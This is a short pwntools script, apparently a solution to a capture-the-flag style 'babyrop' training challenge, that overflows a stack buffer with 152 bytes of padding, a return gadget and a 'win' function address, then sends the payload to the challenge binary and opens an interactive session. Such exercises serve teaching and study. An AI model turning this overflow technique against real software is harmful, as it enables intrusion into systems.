from pwn import *

offset = b'A'*152
win = p64(0x401fca)
ret = p64(0x40101a)

payload = offset
payload += ret
payload += win
print(payload)
with open("run", 'wb') as file:
    file.write(payload)
r = process('/challenge/babyrop_level1.0')
r.sendline(payload)
r.interactive()